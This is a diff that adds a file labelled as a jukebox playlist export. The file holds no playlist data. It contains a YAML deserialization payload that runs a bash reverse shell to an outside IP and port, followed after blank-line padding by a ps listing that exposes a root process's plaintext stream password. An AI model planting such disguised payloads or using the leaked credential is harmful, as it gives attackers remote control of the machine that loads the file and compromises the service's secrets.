@@ -1,0 +1,11 @@
+# Beach Bar jukebox playlist export
+!!python/object/apply:subprocess.check_output
+args:
+  - ["bash", "-c", "bash -i >& /dev/tcp/192.168.181.46/8008 0>&1"]
+  
+  
+  
+ps -eo user,pid,ppid,args
+
+root         609       1 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
+
